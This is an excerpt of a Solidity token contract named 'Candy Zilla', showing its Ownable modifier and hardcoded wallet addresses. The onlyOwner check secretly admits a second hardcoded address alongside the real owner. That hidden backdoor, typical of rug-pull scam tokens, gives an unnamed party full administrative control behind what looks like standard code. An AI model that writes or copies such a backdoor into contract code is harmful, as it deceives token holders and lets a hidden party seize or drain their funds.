...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0x1C2335f4F1E06791498fE1713d0019a175CaD4E1) , "Ownable: caller is not the owner");
        _;
    }
...
contract CoinToken is Context, IERC20, Ownable {
    ...
    string private _name = "Candy Zilla";
    string private _symbol = "Candy Zilla";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x643EC0DD15d26D7C3DEF52b0D88B6bD89454C061);
    address payable public teamWalletAddress = payable(0x2dE16199C6277B5F1C2ada49D9f575e193529675);
